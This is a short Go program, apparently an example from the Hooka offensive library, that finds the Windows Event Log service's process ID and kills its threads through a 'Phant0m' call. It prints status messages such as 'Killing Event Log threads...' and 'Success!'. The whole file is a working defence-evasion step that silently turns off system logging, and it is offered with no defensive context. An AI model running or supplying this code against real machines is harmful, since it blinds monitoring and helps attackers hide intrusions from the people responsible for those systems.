package main

import (
	"fmt"
	"github.com/D3Ext/Hooka/pkg/hooka"
	"log"
)

func main() {
	fmt.Println("[*] Getting Event Log PID...")
	eventlog_pid, err := hooka.GetEventLogPid()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[+] Event Log PID:", eventlog_pid)

	fmt.Println("[*] Killing Event Log threads...")
	err = hooka.Phant0m(eventlog_pid)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[+] Success!")
}
